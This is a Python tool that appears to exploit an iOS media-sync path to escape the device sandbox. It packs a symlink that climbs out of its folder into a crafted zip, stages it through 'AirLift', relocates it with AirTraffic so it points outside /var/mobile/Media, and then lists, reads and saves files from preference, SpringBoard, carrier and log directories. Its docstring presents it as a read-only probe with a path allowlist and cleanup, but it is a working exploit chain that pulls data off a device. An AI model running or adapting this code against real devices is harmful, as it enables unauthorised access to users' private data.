#!/usr/bin/env python3
"""Read-only reconnaissance probe for iOS 27 device paths outside the media sandbox.

The AirLift staging conduit can materialise a relative symlink inside
/var/mobile/Media that, once relocated to the media root by ATAirlock, resolves
to an arbitrary /var/mobile path.  This tool uses that primitive strictly as a
READ channel: it never dispatches the payload asset, so nothing is written
outside /var/mobile/Media, and every staging artefact is rolled back afterwards.

Supported operations:
  --list <dir>     enumerate a directory through the traversal link
  --read <file>    read a file through the traversal link

Only paths under the explicit read-only allowlist below are accepted.
"""

from __future__ import annotations

import argparse
import base64
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import sys
import tempfile
import zipfile
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

ROOT = Path(__file__).resolve().parent.parent
for candidate in (ROOT / "tools", Path(__file__).resolve().parent):
    if candidate.is_dir() and str(candidate) not in sys.path:
        sys.path.insert(0, str(candidate))

from airlift_carrier_deploy import (  # noqa: E402
    AIRTRAFFIC_HOST,
    AirLiftCarrierError,
    build_books_plist,
    collect_books_snapshot,
    native,
    operation_ok,
    run_json,
    select_device,
    zip_info,
)

READ_ONLY_ROOTS = (
    "/var/mobile/Library/Preferences",
    "/var/mobile/Library/SpringBoard",
    "/var/mobile/Library/Carrier Bundles",
    "/var/mobile/Library/Logs",
    "/var/wireless/Library/Preferences",
    "/var/preferences",
)

MAX_READ_BYTES = 8 * 1024 * 1024


def validate_remote_path(path: str) -> str:
    normalized = posixpath.normpath(path)
    if not normalized.startswith("/"):
        raise AirLiftCarrierError(f"Remote path must be absolute: {path}")
    if not any(
        normalized == allowed or normalized.startswith(allowed + "/")
        for allowed in READ_ONLY_ROOTS
    ):
        raise AirLiftCarrierError(
            f"Refusing to probe '{path}': not under the read-only allowlist {READ_ONLY_ROOTS}"
        )
    return normalized


def build_probe_zip(target_dir: str, payload: bytes) -> bytes:
    """Mirror of the AirLift streaming zip, without the writable-target whitelist."""
    target_tail = validate_remote_path(target_dir).lstrip("/")
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def match_read_root(path: str) -> Tuple[str, str]:
    """Return (allowed root, path relative to that root)."""
    normalized = validate_remote_path(path)
    for allowed in READ_ONLY_ROOTS:
        if normalized == allowed or normalized.startswith(allowed + "/"):
            return allowed, normalized[len(allowed):].lstrip("/")
    raise AirLiftCarrierError(f"Refusing to probe '{path}'")


def probe_paths(
    udid: str,
    targets: List[Tuple[str, str]],
    out_dir: Optional[Path],
    verbose: bool = False,
) -> Dict[str, Any]:
    """targets is a list of (mode, remote_path); mode is 'read' or 'list'."""
    grouped: Dict[str, List[Tuple[str, str]]] = {}
    for mode, remote_path in targets:
        link_root, relative = match_read_root(remote_path)
        grouped.setdefault(link_root, []).append((mode, relative))

    report: Dict[str, Any] = {"ok": True, "probes": []}
    for parent, operations in grouped.items():
        report["probes"].append(
            _probe_group(udid, parent, operations, out_dir, verbose)
        )
    report["ok"] = all(entry.get("ok") for entry in report["probes"])
    return report


def _probe_group(
    udid: str,
    parent: str,
    operations: List[Tuple[str, str]],
    out_dir: Optional[Path],
    verbose: bool,
) -> Dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"airlift-src-{token}"
    link_destination = f"airlift-link-{token}"
    recovered = f"airlift-recovered-{token}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    payload_identifier = f"../../{source}/payload"

    entry: Dict[str, Any] = {
        "parent": parent,
        "token": token,
        "results": [],
        "cleanup": None,
    }

    with tempfile.TemporaryDirectory(prefix="airlift-probe-") as temporary:
        work = Path(temporary)
        archive_path = work / f"probe-{token}.zip"
        books_path = work / f"Books-{token}.plist"
        archive_path.write_bytes(build_probe_zip(parent, b"airlift-read-probe"))
        books_path.write_bytes(
            build_books_plist([link_identifier, payload_identifier])
        )

        snapshot_root, snapshot = collect_books_snapshot(udid, work)
        if not operation_ok(snapshot):
            entry["ok"] = False
            entry["error"] = "Books snapshot failed"
            entry["snapshot"] = snapshot
            return entry

        try:
            stage = native(
                "stage",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
                os.fspath(snapshot_root),
            )
            if not operation_ok(stage):
                entry["ok"] = False
                entry["error"] = "staging failed"
                entry["stage"] = stage
                return entry

            # Relocate only the symlink; the payload asset is never dispatched,
            # so no file is written outside the media sandbox.
            atc = run_json(
                [os.fspath(AIRTRAFFIC_HOST), udid, link_identifier, link_destination],
                timeout=120,
            )
            if atc.get("exitCode") != 0 or not atc.get("ok"):
                entry["ok"] = False
                entry["error"] = "AirTraffic link relocation failed"
                entry["atc"] = atc
                return entry

            for mode, relative in operations:
                remote = f"{parent}/{relative}".rstrip("/")
                link_relative = f"{link_destination}/{relative}" if relative else link_destination
                if mode == "list":
                    listing = native("list", udid, link_relative)
                    entry["results"].append(
                        {
                            "mode": "list",
                            "path": remote,
                            "ok": operation_ok(listing),
                            "listing": listing.get("operation", {}),
                        }
                    )
                elif mode == "stat":
                    info = native("info", udid, link_relative)
                    entry["results"].append(
                        {
                            "mode": "stat",
                            "path": remote,
                            "ok": operation_ok(info),
                            "info": info.get("operation", {}),
                        }
                    )
                else:
                    read = native(
                        "read",
                        udid,
                        link_relative,
                        str(MAX_READ_BYTES),
                    )
                    operation = read.get("operation", {})
                    item: Dict[str, Any] = {
                        "mode": "read",
                        "path": remote,
                        "ok": bool(operation.get("ok")),
                        "size": operation.get("size"),
                    }
                    if operation.get("ok"):
                        payload = base64.b64decode(operation.get("base64", ""))
                        if out_dir is not None:
                            destination = out_dir / (relative or posixpath.basename(remote))
                            destination.parent.mkdir(parents=True, exist_ok=True)
                            destination.write_bytes(payload)
                            item["savedTo"] = os.fspath(destination)
                    else:
                        item["error"] = operation.get("error", "read failed")
                    entry["results"].append(item)
        finally:
            cleanup = native(
                "cleanup",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(snapshot_root),
            )
            entry["cleanup"] = cleanup.get("operation", {})
            entry.setdefault("ok", True)
            entry["ok"] = entry["ok"] and operation_ok(cleanup)
            if verbose:
                print(json.dumps(entry, indent=2), file=sys.stderr)
    return entry


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--read", action="append", default=[], metavar="PATH")
    parser.add_argument("--list", action="append", default=[], metavar="DIR")
    parser.add_argument("--stat", action="append", default=[], metavar="PATH")
    parser.add_argument("--udid")
    parser.add_argument("--out", type=Path, help="Directory to save read payloads")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    targets: List[Tuple[str, str]] = []
    for path in args.read:
        targets.append(("read", path))
    for path in args.list:
        targets.append(("list", path))
    for path in args.stat:
        targets.append(("stat", path))
    if not targets:
        parser.error("specify at least one --read or --list target")

    try:
        device = select_device(args.udid)
        report = probe_paths(device["udid"], targets, args.out, args.verbose)
    except AirLiftCarrierError as error:
        print(
            json.dumps(
                {"ok": False, "error": str(error), "details": error.details}, indent=2
            )
        )
        return 2

    print(json.dumps(report, indent=2))
    return 0 if report["ok"] else 2


if __name__ == "__main__":
    sys.exit(main())